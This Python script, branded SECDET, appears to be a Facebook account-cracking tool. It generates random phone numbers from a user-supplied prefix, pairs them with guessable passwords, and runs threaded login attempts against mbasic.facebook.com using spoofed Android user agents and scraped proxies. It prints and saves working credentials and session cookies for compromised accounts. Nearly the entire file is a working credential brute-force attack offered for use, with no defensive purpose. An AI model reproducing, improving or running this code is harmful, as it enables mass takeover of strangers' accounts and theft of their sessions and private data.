# REMMEMBER THE NAME SECDET
#___________Impoet Module____________
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
from os import system as clr
#________________Step 2______________
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______________Coler Code_____________
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
D = '\033[90;1m'
G = '\033[97;1m'
R = '\033[91;1m'
W = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
my_color = [
    B,C,R,W,G
]
secdet = random.choice(my_color)
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_____________Proxy______________
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
      fban_devices = [
    'samsung',
    'huawei',
    'xiaomi',
    'oppo',
    'vivo',
    'nokia',
    'lg',
    'sony',
    'motorola',
    'htc',
    'oneplus',
    'google'
  ]
      fban_versions = [
    '60.0.0.16.76',
    '61.0.0.15.69',
    '62.0.0.14.68',
    '63.0.0.13.67',
    '64.0.0.12.66',
    '65.0.0.11.65',
    '66.0.0.10.64',
    '67.0.0.9.63',
    '68.0.0.8.62',
    '69.0.0.7.61',
    '70.0.0.6.60',
  ]
      android_versions = [
    '13',
    '12',
    '11',
    '10',
    '9',
    '8',
    '7',
    '6',
  ]
      device = random.choice(fban_devices)
      version = random.choice(fban_versions)
      android_version = random.choice(android_versions)
      user_agent = ''
      user_agent += 'Dalvik/2.1.0 (Linux; U; Android {} '.format(android_version)
      user_agent += '; {} Build/{})'.format(device, device)
      user_agent += ' [FBAN/FB4A;FBAV/{} '.format(version)
      user_agent += ';FBPN/com.facebook.katana;FBLC/en_US;FBBV/20454129;FBBD/{} '.format(device)
      user_agent += ';FBDV/{} '.format(device)
      user_agent += ';FBSV/10;FBCA/arm64-v8a:armeabi-v7a;FBDM/{density=3.25,width=1080,height=2028};FB_FW/1]'

      ugen.append(user_agent)
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""\033[94;1m
\033[97;1m
\033[91;1m  ██████ ▓█████  ▄████▄  ▓█████▄ ▓█████▄▄▄█████▓
\033[91;1m▒██    ▒ ▓█   ▀ ▒██▀ ▀█  ▒██▀ ██▌▓█   ▀▓  ██▒ ▓▒
\033[91;1m░ ▓██▄   ▒███   ▒▓█    ▄ ░██   █▌▒███  ▒ ▓██░ ▒░
\033[91;1m  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█▄   ▌▒▓█  ▄░ ▓██▓ ░
\033[91;1m▒██████▒▒░▒████▒▒ ▓███▀ ░░▒████▓ ░▒████▒ ▒██▒ ░
\033[90;1m▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░░
\033[90;1m░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ▒  ▒  ░ ░  ░   ░
\033[94;1m░  ░  ░     ░   ░         ░ ░  ░    ░    ░
\033[94;1m      ░     ░  ░░ ░         ░       ░  ░
\033[91;1m                ░         ░
\t\033[90;1m                               \033[90;1m╔═══════════════════╗ 
            \033[91;1m                             \033[91;1mADNAN\033[94;1m ADIF \033[91;1mHISHAM
                                       \033[90;1m╚═══════════════════╝
\t\033[1;94m╔═══════════════════════╗
\t\033[1;92m  [•] TOOL NAME : XXX
\t\033[1;93m  [•] VERSION   : V.02
\t\033[1;91m╚═══════════════════════╝
""")
 
#LINEX DEF
def linex():
    print(f"{secdet}------------------------------------------------{G}")
#CLEAR DEF
def clear():
    clr("clear")
    print(logo)
#_____________Def Main______________ 
def Main():
        clear()
        linex()
        print(f"{G} [{secdet}A{G}] RANDOM CLONE ")
        print(f"{G} [{secdet}B{G}] EXIT ")
        linex()
        sex = input(f"{B} [{secdet}?{G}] CHOOSE >> ")
        if sex in ["A","B"]:
            fuck()
        if sex in [" 0", "00"]:
            exit()
        else:
            exit()
#______________Def Sc__________            
def fuck():
    user=[]
    clear()
    linex()
    print(f"{W}CHOOSE YOUR CODE LIKE :{G}[+91902 +91934 +91620 +91639]")
    code = input(f'{W}ENTER CODE >> {G}')
    linex()
    name = ''.join(random.choice(string.digits) for _ in range(1))
    cod = ''.join(random.choice(string.digits) for _ in range(1))
    os.system('clear')
    print(logo)
    print(f"{W}EXAMPLE LIMIT {R}[1000,20000,99900] {G}")
    limit=int(input(f"{W}ENTER YOUR LIMIT >> {G}"))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        linex()
        print(f'{W}TOTAL ACCOUNT :' +tl)
        print(f'{W}YOUR SIM CODE :'+code)
        print('PROGRESS HAS BEEN RUNING PLEASE WAIT')
        linex()
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'57575751','57273200',]
            asha.submit(sadiya,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as SECDET-OK.txt')
    print(' [✓] CP Id Save as SECDET-CP.txt')
    print('-------------------')
def sadiya(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(user_agent)
            session = requests.Session()
            sys.stdout.write('\r\r\033[1;37m[SECDET] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = { 'authority': 'x.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'path': 'login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.5',
   		    'content-type': 'application/x-www-form-urlencoded',
   		    'origin': 'https://mbasic.facebook.com',
		    'referer': 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
 		   'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
		    'sec-ch-ua-mobile': '?1',
 		   'sec-ch-ua-platform': '"Android"',
	 	   'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
 		   'user-agent': pro, }
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\r\033[92;1m[OK] {uid}|{ps}")
                print(coki)
                open('/sdcard/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\r\033[92;1m[CP] {uid}|{ps}")
                
                open('/sdcard/CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()